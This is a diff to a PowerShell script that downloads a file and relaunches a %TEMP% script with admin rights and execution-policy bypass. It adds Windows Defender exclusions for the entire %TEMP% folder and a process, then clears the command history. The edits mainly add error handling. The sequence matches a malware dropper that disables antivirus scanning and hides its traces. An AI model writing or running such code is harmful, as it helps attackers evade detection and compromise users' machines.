@@ -10,23 +10,37 @@ Invoke-WebRequest -Uri $url -OutFile $destination
 # Output the path to confirm where the file was saved
 Write-Output "File downloaded to: $destination"
 
+##############################################
 
 # Check if the script is running with elevated privileges
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    # Define the path to %TEMP%\ftf.ps1
-    $scriptPath = "$env:TEMP\ftf.ps1"
+    try {
+        # Define the path to %TEMP%\ftf.ps1
+        $scriptPath = "$env:TEMP\ftf.ps1"
 
-    # Relaunch the script with elevated privileges
-    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs
+        # Relaunch the script with elevated privileges
+        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs
+    } catch {
+        Write-Host "Error occurred while trying to elevate privileges: $($_.Exception.Message)"
+    }
     exit
 }
 
-# Set the execution policy
-Set-ExecutionPolicy RemoteSigned -Force -ErrorAction Continue
+# Example: Set execution policy
+try {
+    Set-ExecutionPolicy RemoteSigned -Force
+} catch {
+    Write-Host "Error setting execution policy: $($_.Exception.Message)"
+}
 
-# Add Exlusion in Windows Defender
-Add-MpPreference -ExclusionPath "$env:TEMP" -ExclusionProcess "example.exe" -ErrorAction Continue
+# Example: Add exclusion in Windows Defender
+try {
+    Add-MpPreference -ExclusionPath "$env:TEMP" -ExclusionProcess "example.exe"
+} catch {
+    Write-Host "Error adding Windows Defender exclusion: $($_.Exception.Message)"
+}
 
+# Continue the rest of your script...
 
 Clear-History
 # ##############################################################################
